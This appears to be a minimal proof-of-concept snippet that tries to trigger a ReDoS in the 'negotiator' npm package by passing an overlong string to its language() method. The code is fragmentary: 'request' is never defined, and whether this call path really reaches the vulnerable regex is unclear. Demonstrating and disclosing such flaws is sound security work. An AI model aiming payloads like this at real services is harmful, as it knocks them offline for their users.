//requires intializing a server for request/response
var Negotiator = require('negotiator') //npm install negotiator

negotiator = new Negotiator(request) //constructor intialized

negotiator.language(['ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss']) //negotiator will try to match this as a language and the regex will take too much time, causing a reDoS
